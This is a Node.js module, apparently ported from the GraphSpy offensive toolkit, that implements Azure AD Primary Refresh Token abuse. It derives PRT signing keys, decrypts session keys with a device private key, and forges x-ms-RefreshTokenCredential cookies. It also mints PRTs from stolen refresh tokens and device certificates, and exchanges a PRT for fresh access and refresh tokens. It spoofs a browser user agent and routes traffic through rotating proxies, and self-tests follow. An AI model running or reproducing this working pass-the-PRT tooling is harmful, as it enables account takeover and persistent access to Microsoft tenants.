'use strict';

const crypto = require('crypto');
const ms = require('./microsoftclient');

// ─── Constants (exact values from GraphSpy) ────────────────────────────────
const KDF_LABEL = 'AzureAD-SecureConversation';          
const DEFAULT_TIMEOUT = 30000;
const TOKEN_ENDPOINT = 'https://login.microsoftonline.com/common/oauth2/token';

// Client IDs (prt.py)
const DEVICE_TOKEN_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e'; 
const DEFAULT_PRT_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';  
const DEFAULT_RESOURCE = 'https://graph.microsoft.com';
const DEFAULT_SCOPE = 'https://graph.microsoft.com/.default openid offline_access';
const DEFAULT_WIN_VER = '10.0.26100';

// User-Agent — exact default from GraphSpy core/user_agent.py
const PRT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0';

// ─── Base64url helpers ─────────────────────────────────────────────────────
function b64url(input) {
  const buf = Buffer.isBuffer(input) ? input : Buffer.from(String(input));
  return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function fromB64url(str) {
  let s = String(str || '').replace(/-/g, '+').replace(/_/g, '/').replace(/=+$/, '');
  while (s.length % 4) s += '=';
  return Buffer.from(s, 'base64');
}

// ─── Context generation ────────────────────────────────────────────────────
/**
 * @returns {Buffer} 24 random bytes
 */
function randomContext() {
  return crypto.randomBytes(24);
}

// ─── KBKDF ─────────────────────────────────────────────────────────────────
/**
 * @param {Buffer|string} sessionKey raw session key bytes (or hex/base64 str)
 * @param {Buffer|string} context    raw context bytes (or base64/hex str)
 * @param {number} [length=32]       output length in bytes
 * @returns {Buffer}
 */
function calculateDerivedKey(sessionKey, context, length = 32) {
  const key = toKeyBytes(sessionKey);
  const ctx = toKeyBytes(context);
  const digestSize = 32; 
  const rounds = Math.ceil(length / digestSize);
  const rlen = 4; 
  const llen = 4; 
  const label = Buffer.from(KDF_LABEL, 'utf8');
  const lVal = Buffer.alloc(llen);
  lVal.writeUInt32BE(length * 8, 0); 

  let out = Buffer.alloc(0);
  for (let i = 1; i <= rounds; i++) {
    const counter = Buffer.alloc(rlen);
    counter.writeUInt32BE(i, 0);
    const data = Buffer.concat([counter, label, Buffer.from([0]), ctx, lVal]);
    const h = crypto.createHmac('sha256', key).update(data).digest();
    out = Buffer.concat([out, h]);
  }
  return out.slice(0, length);
}


function toKeyBytes(input) {
  if (Buffer.isBuffer(input)) return input;
  const s = String(input == null ? '' : input).trim();
  if (/^[0-9a-fA-F]+$/.test(s) && s.length % 2 === 0) return Buffer.from(s, 'hex');
  return fromB64url(s);
}

function buildJwt(headerObj, payloadObj, key, alg) {
  const baseHeader = Object.assign({}, headerObj || {});
  if (!baseHeader.alg) baseHeader.alg = alg;
  if (!baseHeader.typ) baseHeader.typ = 'JWT';
  const headerSeg = b64url(JSON.stringify(baseHeader));
  const payloadSeg = b64url(JSON.stringify(payloadObj));
  const signingInput = headerSeg + '.' + payloadSeg;
  let signature;
  if (alg === 'HS256') {
    if (!Buffer.isBuffer(key)) throw new Error('buildJwt: HS256 requires a Buffer key');
    signature = crypto.createHmac('sha256', key).update(signingInput, 'utf8').digest();
  } else if (alg === 'RS256') {
    signature = crypto.sign('sha256', Buffer.from(signingInput, 'utf8'), key);
  } else {
    throw new Error('buildJwt: unsupported alg ' + alg);
  }
  return signingInput + '.' + b64url(signature);
}

/**
 * @param {Buffer|string} sessionKey raw session key (Buffer/hex/base64)
 * @param {object} headers  JWT header (must include ctx, standard base64)
 * @param {object} payloadObj JWT payload
 * @returns {Buffer} 32-byte derived key
 */
function deriveJwtSigningKey(sessionKey, headers, payloadObj) {
  if (!headers || !headers.ctx) throw new Error('deriveJwtSigningKey: headers.ctx required');
  const context = Buffer.from(String(headers.ctx), 'base64'); // standard base64
  const tempjwt = buildJwt(headers, payloadObj, crypto.randomBytes(32), 'HS256');
  const jwtbody = fromB64url(tempjwt.split('.')[1]);
  const kdfContext = crypto.createHash('sha256').update(context).update(jwtbody).digest();
  return calculateDerivedKey(sessionKey, kdfContext);
}

// ─── Session-key JWE decrypt ───────────────────────────────────────────────
function sessionKeyClaimToHex(claim) {
  const s = String(claim == null ? '' : claim).trim();
  if (!s) throw new Error('session key claim is empty');
  if (/^[0-9a-fA-F]+$/.test(s) && s.length % 2 === 0) return s.toLowerCase();
  return fromB64url(s).toString('hex');
}

/**
 * @param {string} input  any of the formats above
 * @param {string} [privateKeyPem] device private key PEM — JWE path only
 * @returns {string} session key as lowercase hex (GraphSpy storage format)
 */
function decryptSessionKey(input, privateKeyPem) {
  let s = String(input == null ? '' : input).trim();
  if (!s) throw new Error('decryptSessionKey: empty input');

  if (s.startsWith('{')) {
    let obj;
    try { obj = JSON.parse(s); } catch (_) { throw new Error('decryptSessionKey: input looks like JSON but does not parse'); }
    s = String(obj.session_key_jwe || obj.session_key_enc || obj.session_key || '').trim();
    if (!s) throw new Error('decryptSessionKey: JSON blob has no session key material');
  }

  const segs = s.split('.');
  if (segs.length === 3) {
    let body;
    try { body = JSON.parse(fromB64url(segs[1]).toString('utf8')); } catch (_) { throw new Error('decryptSessionKey: cannot parse JWT payload segment'); }
    return sessionKeyClaimToHex(body.session_key || body.session_key_enc || body.session_key_jwe);
  }
  if (segs.length >= 5) {
    if (!privateKeyPem) throw new Error('decryptSessionKey: private key PEM required for JWE input');
    const encKey = fromB64url(segs[1]);
    const sessionKey = crypto.privateDecrypt(
      { key: privateKeyPem, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha1' },
      encKey
    );
    return sessionKey.toString('hex');
  }
  return sessionKeyClaimToHex(s);
}

// ─── Slice A core: PRT cookie JWT ──────────────────────────────────────────
/**
 * @param {string} prt        primary refresh token JWT
 * @param {Buffer|string} sessionKey raw session key (Buffer/hex/base64)
 * @param {string} nonce      srv_challenge nonce (getSrvChallengeNonce())
 * @returns {string} compact JWT — the cookie value
 */
function buildPrtCookieJwt(prt, sessionKey, nonce) {
  if (!prt) throw new Error('buildPrtCookieJwt: prt required');
  if (!nonce) throw new Error('buildPrtCookieJwt: nonce required (call getSrvChallengeNonce first)');
  const context = randomContext();
  const headers = { ctx: context.toString('base64'), kdf_ver: 2 }; // std base64, padding kept
  const payload = { refresh_token: prt, is_primary: 'true', request_nonce: nonce };
  const derivedKey = deriveJwtSigningKey(sessionKey, headers, payload);
  return buildJwt(headers, payload, derivedKey, 'HS256');
}

function prtCookieDomain(prt, fallback) {
  const fb = fallback || 'login.microsoftonline.com';
  try {
    const payload = JSON.parse(fromB64url(String(prt).split('.')[1]).toString('utf8'));
    const cty = payload && payload.cty;
    if (typeof cty === 'string' && cty.includes('.')) {
      const host = cty.split('.').slice(1).join('.');
      if (host) return host === 'sts.windows.net' ? 'login.microsoftonline.com' : host;
    }
  } catch (_) { /* unparseable PRT -> fallback */ }
  return fb;
}

// ─── Encrypted PRT response decrypt ────────────────────────────────────────
/**
 * @param {string} jweText  raw response body (5-part compact JWE)
 * @param {Buffer|string} sessionKey raw session key (Buffer/hex/base64)
 * @returns {object} parsed JSON (access_token, refresh_token?, foci?, ...)
 */
function decryptPrtResponse(jweText, sessionKey) {
  const parts = String(jweText == null ? '' : jweText).trim().split('.');
  if (parts.length !== 5) {
    throw new Error('decryptPrtResponse: expected a 5-part compact JWE, got ' + parts.length + ' segments');
  }
  const headerSeg = parts[0];
  const ivSeg = parts[2];
  const ciphertextSeg = parts[3];
  const authtagSeg = parts[4];

  let headerJson;
  try { headerJson = JSON.parse(fromB64url(headerSeg).toString('utf8')); }
  catch (_) { throw new Error('decryptPrtResponse: malformed JWE header segment'); }
  if (!headerJson || !headerJson.ctx) throw new Error('decryptPrtResponse: JWE header missing "ctx"');
  const context = Buffer.from(String(headerJson.ctx), 'base64'); // standard base64
  const derivedKey = calculateDerivedKey(sessionKey, context);

  const iv = fromB64url(ivSeg);
  const ciphertext = fromB64url(ciphertextSeg);

  let plain;
  if (iv.length === 12) {
    const decipher = crypto.createDecipheriv('aes-256-gcm', derivedKey, iv);
    decipher.setAAD(Buffer.from(headerSeg, 'utf8'));
    decipher.setAuthTag(fromB64url(authtagSeg));
    plain = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  } else {
    const decipher = crypto.createDecipheriv('aes-256-cbc', derivedKey, iv);
    plain = Buffer.concat([decipher.update(ciphertext), decipher.final()]); // auto PKCS7
  }

  let json;
  try { json = JSON.parse(plain.toString('utf8')); } catch (_) { throw new Error('decryptPrtResponse: decrypted body is not JSON'); }
  if (!json || !json.access_token) throw new Error("decryptPrtResponse: no 'access_token' in decrypted response");
  return json;
}

// ─── Network helpers ───────────────────────────────────────────────────────
function normalizeCertForX5c(certificateInput) {
  const s = String(certificateInput == null ? '' : certificateInput).trim();
  if (!s) return s;
  if (s.includes('-----BEGIN CERTIFICATE-----')) {
    try {
      const x509 = new crypto.X509Certificate(s);
      return x509.raw.toString('base64');
    } catch (e) {
      throw new Error('normalizeCertForX5c: could not parse PEM certificate (' + e.message + ')');
    }
  }
  return s;
}

function formHeaders() {
  return { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': PRT_USER_AGENT };
}

function nonceFromResponse(response, label) {
  const body = (response && response.data) || {};
  if (response.status !== 200) {
    const msg = body.error_description || body.error || 'HTTP ' + response.status;
    throw new Error(label + ': nonce request failed — ' + String(msg).substring(0, 500));
  }
  if (!body.Nonce) throw new Error(label + ': no "Nonce" in nonce response');
  return body.Nonce;
}

/**
 * @param {object} [opts]
 *   opts.proxy       reuse an already-claimed proxy row (sticky flows)
 *   opts.claimProxy  claim + return a sticky proxy: resolves {nonce, proxy}
 * @returns {Promise<string|{nonce:string,proxy:object}>}
 */
async function getSrvChallengeNonce(opts) {
  const options = opts || {};
  const params = new URLSearchParams({ grant_type: 'srv_challenge' });
  const axiosOpts = {
    headers: formHeaders(),
    timeout: options.timeout || DEFAULT_TIMEOUT,
    validateStatus: () => true,
  };
  if (options.claimProxy) {
    const { proxy, response } = await ms.post(TOKEN_ENDPOINT, params, Object.assign({ stickyProxy: true }, axiosOpts));
    return { nonce: nonceFromResponse(response, 'getSrvChallengeNonce'), proxy };
  }
  if (options.proxy) axiosOpts.proxy = options.proxy;
  const response = await ms.post(TOKEN_ENDPOINT, params, axiosOpts);
  return nonceFromResponse(response, 'getSrvChallengeNonce');
}

/**
 * Slice A — PRT + session key -> x-ms-RefreshTokenCredential cookie.
 *
 * @param {object} p
 *   p.prt         PRT JWT (required)
 *   p.sessionKey  raw session key, hex/base64/Buffer (required)
 *   p.nonce       optional — fetched via srv_challenge when omitted
 *   p.domain      optional cookie domain (default: derived from the PRT cty claim)
 * @returns {Promise<{name:string,value:string,domain:string,path:string,nonce:string}>}
 */
async function generatePrtCookie(p) {
  if (!p || !p.prt || !p.sessionKey) throw new Error('generatePrtCookie: prt and sessionKey are required');
  let nonce;
  let proxy;
  if (p.nonce) {
    nonce = p.nonce;
  } else {
    const r = await getSrvChallengeNonce({ claimProxy: true });
    nonce = r.nonce;
    proxy = r.proxy;
  }
  try {
    const value = buildPrtCookieJwt(p.prt, p.sessionKey, nonce);
    return { name: 'x-ms-RefreshTokenCredential', value, domain: p.domain || prtCookieDomain(p.prt), path: '/', nonce };
  } finally {
    if (proxy) await ms.release(proxy, true);
  }
}

/**
 * @param {object} p
 *   p.refreshToken        normal (non-PRT) refresh token (required)
 *   p.privateKeyPem       device private key PEM (required)
 *   p.certificateBase64   device certificate, base64 (required) — raw cert b64
 *   p.osVersion           optional win_ver (default 10.0.26100)
 *   p.nonce               optional — fetched via srv_challenge when omitted
 * @returns {Promise<{prt,sessionKeyJwe,sessionKeyHex,expiresOn,user,raw}>}
 */
async function requestPrtForDevice(p) {
  if (!p || !p.refreshToken || !p.privateKeyPem || !p.certificateBase64) {
    throw new Error('requestPrtForDevice: refreshToken, privateKeyPem and certificateBase64 are required');
  }
  let nonce;
  let proxy;
  let ok = false;
  if (p.nonce) {
    nonce = p.nonce;
  } else {
    const r = await getSrvChallengeNonce({ claimProxy: true });
    nonce = r.nonce;
    proxy = r.proxy;
  }
  try {
    const payload = {
      client_id: DEVICE_TOKEN_CLIENT_ID,
      request_nonce: nonce,
      scope: 'openid aza ugs',
      group_sids: [],
      win_ver: p.osVersion || DEFAULT_WIN_VER,
      grant_type: 'refresh_token',
      refresh_token: p.refreshToken,
    };
    const requestJwt = buildJwt({ x5c: normalizeCertForX5c(p.certificateBase64), kdf_ver: 2 }, payload, p.privateKeyPem, 'RS256');
    const params = new URLSearchParams({
      windows_api_version: '2.2',
      grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
      request: requestJwt,
      tgt: 'False',
    });
    const resp = await ms.post(TOKEN_ENDPOINT, params, Object.assign({
      timeout: DEFAULT_TIMEOUT,
      validateStatus: () => true,
    }, proxy ? { proxy } : {}, { headers: formHeaders() }));
    const body = resp.data || {};
    if (resp.status !== 200) {
      throw new Error('requestPrtForDevice: HTTP ' + resp.status + ' — ' + String(body.error_description || body.error || 'no error body').substring(0, 500));
    }
    if (!body.refresh_token || !body.session_key_jwe) {
      throw new Error("requestPrtForDevice: response has no 'refresh_token' or 'session_key_jwe'");
    }
    ok = true;
    return {
      prt: body.refresh_token,
      sessionKeyJwe: body.session_key_jwe,
      sessionKeyHex: decryptSessionKey(body.session_key_jwe, p.privateKeyPem),
      expiresOn: body.expires_on || null,
      user: body.user || body.upn || null,
      raw: body,
    };
  } finally {
    if (proxy) await ms.release(proxy, ok);
  }
}

/**
 * @param {object} p
 *   p.prt            PRT JWT (required)
 *   p.sessionKey     raw session key, hex/base64/Buffer (required)
 *   p.clientId       default d3590ed6-52b3-4102-aeff-aad2292ab01c (broker plugin)
 *   p.resource       default https://graph.microsoft.com
 *   p.scope          default "https://graph.microsoft.com/.default openid offline_access"
 *                    (apiVersion 1 ignores scope — it uses "openid aza"/"openid")
 *   p.refreshPrt     default true — append "aza" so AAD returns a FRESH PRT
 *   p.redirectUri    default ms-appx-web://Microsoft.AAD.BrokerPlugin/{clientId}
 *   p.apiVersion     1 (windows_api_version 2.2) or 2 (prt_protocol_version 3.0)
 *   p.nonce          optional — fetched via srv_challenge when omitted
 * @returns {Promise<{accessToken,tokenType,refreshToken,expiresIn,foci,idToken,raw}>}
 */
async function prtToAccessToken(p) {
  if (!p || !p.prt || !p.sessionKey) throw new Error('prtToAccessToken: prt and sessionKey are required');
  const apiVersion = p.apiVersion == null ? 1 : p.apiVersion;
  const clientId = p.clientId || DEFAULT_PRT_CLIENT_ID;
  const now = Math.floor(Date.now() / 1000);

  let nonce;
  let proxy;
  let ok = false;
  if (p.nonce) {
    nonce = p.nonce;
  } else {
    const r = await getSrvChallengeNonce({ claimProxy: true });
    nonce = r.nonce;
    proxy = r.proxy;
  }
  try {
    const refreshPrt = p.refreshPrt !== false;
    const payload = {
      request_nonce: nonce,
      refresh_token: p.prt,
      redirect_uri: p.redirectUri || 'ms-appx-web://Microsoft.AAD.BrokerPlugin/' + clientId,
      grant_type: 'refresh_token',
      client_id: clientId,
    };
    if (apiVersion === 1) {
      Object.assign(payload, {
        win_ver: DEFAULT_WIN_VER,
        scope: refreshPrt ? 'openid aza' : 'openid',
        iss: 'aad:brokerplugin',
        resource: p.resource || DEFAULT_RESOURCE,
        aud: 'login.microsoftonline.com',
        iat: String(now),
        exp: String(now + 3600),
      });
    } else if (apiVersion === 2) {
      Object.assign(payload, {
        scope: refreshPrt ? (p.scope || DEFAULT_SCOPE) + ' aza' : (p.scope || DEFAULT_SCOPE),
        aud: 'https://login.windows.net/common/oauth2/v2.0/token',
        iss: DEVICE_TOKEN_CLIENT_ID,
      });
    } else {
      throw new Error('prtToAccessToken: invalid apiVersion ' + apiVersion + ' (expected 1 or 2)');
    }

    const context = randomContext();
    const headers = { ctx: context.toString('base64'), kdf_ver: 2 };
    const derivedKey = deriveJwtSigningKey(p.sessionKey, headers, payload);
    const requestJwt = buildJwt(headers, payload, derivedKey, 'HS256');

    const params = new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
      request: requestJwt,
      client_info: '1',
    });
    const tokenUrl = apiVersion === 1 ? TOKEN_ENDPOINT : 'https://login.windows.net/common/oauth2/v2.0/token';
    if (apiVersion === 1) params.set('windows_api_version', '2.2');
    else params.set('prt_protocol_version', '3.0');

    const resp = await ms.post(tokenUrl, params, Object.assign({
      timeout: DEFAULT_TIMEOUT,
      validateStatus: () => true,
    }, proxy ? { proxy } : {}, { headers: formHeaders() }));

    if (resp.status !== 200) {
      const d = resp.data;
      const msg = typeof d === 'string' ? d : String((d && (d.error_description || d.error)) || 'no error body');
      throw new Error('prtToAccessToken: HTTP ' + resp.status + ' — ' + msg.substring(0, 500));
    }
    const decrypted = decryptPrtResponse(String(resp.data), p.sessionKey);
    ok = true;
    return {
      accessToken: decrypted.access_token,
      tokenType: decrypted.token_type,
      refreshToken: decrypted.refresh_token || null, // NEW PRT when refreshPrt
      expiresIn: decrypted.expires_in || decrypted.refresh_token_expires_in || null,
      foci: decrypted.foci || null,
      idToken: decrypted.id_token || null,
      raw: decrypted,
    };
  } finally {
    if (proxy) await ms.release(proxy, ok);
  }
}

// ─── Self test (no network) ────────────────────────────────────────────────
const GOLDEN = {
  sessionKeyHex: '000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f',
  vectors: [
    { name: 'ctx_zero32',    contextHex: '0000000000000000000000000000000000000000000000000000000000000000', derivedHex: 'd3a2b90282cfa63e49eded6e577712864480a13438aab2aac7dd67fe20256465' },
    { name: 'ctx_range24',   contextHex: '000102030405060708090a0b0c0d0e0f1011121314151617',             derivedHex: '70296b4334bf08f7bc6953575e6b6c18959dbcad6adb263fb625939d099456b3' },
    { name: 'ctx_sha256_hi', contextHex: 'afa27b44d43b02a9fea41d13cedc2e4016cfcf87c5dbf990e593669aa8ce286d', derivedHex: 'a6c6fe612130976718f156570ca9a06e056dce762fedeaa8ed20d7e66fc0513b' },
  ],
};

function selfTest() {
  const failures = [];
  const test = (name, fn) => {
    try {
      fn();
      console.log('[prtkdf.selfTest] PASS  ' + name);
    } catch (e) {
      failures.push(name);
      console.error('[prtkdf.selfTest] FAIL  ' + name + ' — ' + (e && e.message ? e.message : e));
    }
  };

  for (const v of GOLDEN.vectors) {
    test('KDF golden vector ' + v.name, () => {
      const got = calculateDerivedKey(Buffer.from(GOLDEN.sessionKeyHex, 'hex'), Buffer.from(v.contextHex, 'hex')).toString('hex');
      if (got !== v.derivedHex) throw new Error('got ' + got + ' want ' + v.derivedHex);
    });
  }

  test('toKeyBytes (Buffer/hex/base64url)', () => {
    const buf = crypto.randomBytes(24);
    if (!toKeyBytes(buf).equals(buf)) throw new Error('Buffer passthrough');
    if (!toKeyBytes(buf.toString('hex')).equals(buf)) throw new Error('hex');
    if (!toKeyBytes(buf.toString('base64url')).equals(buf)) throw new Error('base64url');
  });

  test('b64url round-trip', () => {
    for (const n of [1, 3, 15, 24, 32, 33, 64]) {
      const buf = crypto.randomBytes(n);
      if (!fromB64url(b64url(buf)).equals(buf)) throw new Error('round-trip failed for ' + n + ' bytes');
    }
  });

  test('buildJwt RS256 sign/verify', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    const pem = privateKey.export({ type: 'pkcs8', format: 'pem' });
    const jwt = buildJwt({ x5c: 'certb64', kdf_ver: 2 }, { iss: 'user@tenant.com', aud: 'common' }, pem, 'RS256');
    const segs = jwt.split('.');
    if (segs.length !== 3) throw new Error('expected 3 segments');
    const verified = crypto.verify('sha256', Buffer.from(segs[0] + '.' + segs[1], 'utf8'), publicKey, fromB64url(segs[2]));
    if (!verified) throw new Error('signature did not verify');
  });

  test('decryptSessionKey RSA-OAEP (JWE segment 2)', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    const pem = privateKey.export({ type: 'pkcs8', format: 'pem' });
    const sessionKey = crypto.randomBytes(32);
    const encKey = crypto.publicEncrypt(
      { key: publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha1' },
      sessionKey
    );
    const fakeJwe = [
      b64url(JSON.stringify({ alg: 'RSA-OAEP', enc: 'A256GCM' })),
      b64url(encKey),
      b64url(crypto.randomBytes(12)),
      b64url(crypto.randomBytes(16)),
      b64url(crypto.randomBytes(16)),
    ].join('.');
    if (decryptSessionKey(fakeJwe, pem) !== sessionKey.toString('hex')) throw new Error('OAEP round-trip mismatch');
    if (decryptSessionKey(JSON.stringify({ refresh_token: 'x', session_key_jwe: fakeJwe }), pem) !== sessionKey.toString('hex')) throw new Error('JSON blob wrapper mismatch');
  });

  test('decryptSessionKey (PRT JWT claim + hex passthrough)', () => {
    const sk = crypto.randomBytes(32);
    const fakePrt = [
      b64url(JSON.stringify({ alg: 'RS256' })),
      b64url(JSON.stringify({ session_key: sk.toString('base64url'), cty: 'abc.sts.windows.net' })),
      b64url(crypto.randomBytes(32)),
    ].join('.');
    if (decryptSessionKey(fakePrt, null) !== sk.toString('hex')) throw new Error('JWT claim mismatch');
    if (decryptSessionKey(sk.toString('hex'), null) !== sk.toString('hex')) throw new Error('hex passthrough mismatch');
  });

  test('buildPrtCookieJwt structure + KDF signature', () => {
    const prt = 'a.b.c';
    const sessionKey = crypto.randomBytes(32);
    const cookie = buildPrtCookieJwt(prt, sessionKey, 'nonce-xyz');
    const segs = cookie.split('.');
    if (segs.length !== 3) throw new Error('expected 3 segments');
    const header = JSON.parse(fromB64url(segs[0]).toString('utf8'));
    const payload = JSON.parse(fromB64url(segs[1]).toString('utf8'));
    if (header.kdf_ver !== 2) throw new Error('kdf_ver must be 2');
    const ctxBuf = Buffer.from(header.ctx, 'base64');
    if (ctxBuf.length !== 24) throw new Error('ctx must decode to 24 bytes');
    if (payload.refresh_token !== prt || payload.is_primary !== 'true' || payload.request_nonce !== 'nonce-xyz') throw new Error('payload claims wrong');
    // re-derive exactly as the server would, and re-check the signature
    const kdfCtx = crypto.createHash('sha256').update(ctxBuf).update(fromB64url(segs[1])).digest();
    const derived = calculateDerivedKey(sessionKey, kdfCtx);
    const expectSig = b64url(crypto.createHmac('sha256', derived).update(segs[0] + '.' + segs[1], 'utf8').digest());
    if (expectSig !== segs[2]) throw new Error('derived-key signature mismatch');
  });

  const makeFakePrtJwe = (sessionKey, mode) => {
    const ctx = crypto.randomBytes(24);
    const headerSeg = b64url(JSON.stringify({ alg: 'dir', enc: mode === 'gcm' ? 'A256GCM' : 'A256CBC', ctx: ctx.toString('base64') }));
    const derived = calculateDerivedKey(sessionKey, ctx);
    const plaintext = JSON.stringify({ access_token: 'AT-FAKE', token_type: 'Bearer', expires_in: '3599', refresh_token: 'RT-FAKE', foci: 'U:1' });
    const iv = crypto.randomBytes(mode === 'gcm' ? 12 : 16);
    const enc = crypto.createCipheriv(mode === 'gcm' ? 'aes-256-gcm' : 'aes-256-cbc', derived, iv);
    if (mode === 'gcm') enc.setAAD(Buffer.from(headerSeg, 'utf8'));
    const ct = Buffer.concat([enc.update(plaintext, 'utf8'), enc.final()]);
    const tag = mode === 'gcm' ? enc.getAuthTag() : crypto.randomBytes(16);
    return [headerSeg, b64url(Buffer.alloc(0)), b64url(iv), b64url(ct), b64url(tag)].join('.');
  };
  test('decryptPrtResponse A256GCM round-trip', () => {
    const sk = crypto.randomBytes(32);
    const out = decryptPrtResponse(makeFakePrtJwe(sk, 'gcm'), sk);
    if (out.access_token !== 'AT-FAKE' || out.refresh_token !== 'RT-FAKE' || out.foci !== 'U:1') throw new Error('decrypted payload wrong');
  });
  test('decryptPrtResponse A256CBC round-trip', () => {
    const sk = crypto.randomBytes(32);
    const out = decryptPrtResponse(makeFakePrtJwe(sk, 'cbc'), sk);
    if (out.access_token !== 'AT-FAKE') throw new Error('decrypted payload wrong');
  });

  test('prtCookieDomain cty extraction', () => {
    const mk = (cty) => [b64url(JSON.stringify({ alg: 'RS256' })), b64url(JSON.stringify({ cty })), b64url('sig')].join('.');
    if (prtCookieDomain(mk('1w65Fw0+aYImhGdd+RDo8HU5em47ehmV.sts.windows.net')) !== 'login.microsoftonline.com') throw new Error('sts.windows.net mapping');
    if (prtCookieDomain(mk('abc.login.microsoftonline.com')) !== 'login.microsoftonline.com') throw new Error('direct domain');
    if (prtCookieDomain('not-a-jwt') !== 'login.microsoftonline.com') throw new Error('fallback domain');
  });

  if (failures.length) {
    console.error('[prtkdf.selfTest] ' + failures.length + ' TEST(S) FAILED: ' + failures.join(', '));
    process.exitCode = 1;
  } else {
    console.log('[prtkdf.selfTest] ALL TESTS PASSED');
  }
  return failures.length === 0;
}

// ─── Exports ───────────────────────────────────────────────────────────────
module.exports = {
  // crypto core
  calculateDerivedKey,
  decryptSessionKey,
  buildPrtCookieJwt,
  decryptPrtResponse,
  // network slices
  getSrvChallengeNonce,
  generatePrtCookie,
  requestPrtForDevice,
  prtToAccessToken,
  // helpers (used by tests / integration)
  buildJwt,
  normalizeCertForX5c,
  randomContext,
  deriveJwtSigningKey,
  prtCookieDomain,
  toKeyBytes,
  b64url,
  fromB64url,
  // constants
  KDF_LABEL,
  TOKEN_ENDPOINT,
  DEVICE_TOKEN_CLIENT_ID,
  DEFAULT_PRT_CLIENT_ID,
  DEFAULT_RESOURCE,
  DEFAULT_SCOPE,
  DEFAULT_WIN_VER,
  PRT_USER_AGENT,
  // self test
  selfTest,
  GOLDEN,
};
